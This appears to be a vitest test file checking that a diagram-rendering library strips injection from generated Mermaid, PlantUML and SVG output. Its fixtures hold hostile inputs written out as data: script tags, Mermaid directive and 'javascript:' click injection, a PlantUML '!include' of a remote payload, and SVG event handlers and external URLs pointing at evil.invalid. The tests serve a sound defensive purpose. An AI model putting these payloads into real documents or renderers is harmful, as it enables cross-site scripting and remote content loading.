import { expect, it } from "vitest";
import {
  sanitizeGeneratedSvgMarkup,
  validateMermaidFlowchart,
  visualIRToMermaid,
  visualIRToPlantUML,
} from "./visual-rendering.js";

function flowchart(overrides = {}) {
  return {
    schemaVersion: 1,
    id: "security-flow",
    kind: "flowchart",
    nodes: [
      {
        id: "source",
        label: 'Start </text><script>alert(1)</script> \" ] %%{init:{securityLevel:\"loose\"}}%%',
        shape: "box",
        geometry: { bbox: [0, 0, 100, 40] },
      },
      {
        id: "target",
        label: "End",
        shape: "box",
        geometry: { bbox: [150, 0, 250, 40] },
      },
    ],
    edges: [
      {
        source: "source",
        target: "target",
        directed: true,
        label: "safe | click source javascript:alert(1);",
      },
    ],
    provenance: { producer: "security-test", version: "1" },
    confidence: { overall: 0.95 },
    disposition: "accepted",
    ...overrides,
  };
}

it("serializes malicious PDF-derived Mermaid labels only through the strict flowchart grammar", () => {
  const mermaid = visualIRToMermaid(flowchart());
  expect(() => validateMermaidFlowchart(mermaid)).not.toThrow();
  expect(mermaid).not.toMatch(/<script|<\/text>|%%\{|;\s*click/i);
  expect(mermaid).not.toContain('label:***');
  expect(mermaid.match(/^flowchart\s+/gm)).toHaveLength(1);
});

it("keeps PlantUML generation inside GlyphMend's fixed subset", () => {
  const uml = flowchart({
    kind: "diagram",
    styles: { diagram: { notation: "uml-class" } },
    nodes: [
      {
        id: "class-a",
        label: 'Account\n!include https://evil.invalid/payload\n@enduml\n<script>alert(1)</script>',
        geometry: { bbox: [0, 0, 100, 40] },
      },
    ],
    edges: [],
  });
  const output = visualIRToPlantUML(uml);
  expect(output.match(/@startuml/g)).toHaveLength(1);
  expect(output.match(/@enduml/g)).toHaveLength(1);
  expect(output).not.toMatch(/!include|<script|https:\/\/evil\.invalid/i);
});

it("removes scripts, event handlers, external URLs, foreign content, and external paint servers from SVG", () => {
  const clean = sanitizeGeneratedSvgMarkup(`
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" viewBox="0 0 20 20">
      <script>alert(1)</script>
      <foreignObject><div>html</div></foreignObject>
      <a href="https://evil.invalid/"><text>external link</text></a>
      <rect id="safeRect" x="0" y="0" width="10" height="10" fill="url(https://evil.invalid/fill.svg#x)" onclick="alert(1)"/>
      <text id="safeText" x="2" y="15">Safe text</text>
    </svg>
  `);

  expect(clean).toContain("Safe text");
  expect(clean).toContain('id="safeRect"');
  expect(clean).not.toMatch(/<script|foreignObject|<a\b|onload|onclick|https:\/\/evil\.invalid|url\(https?:/i);
});
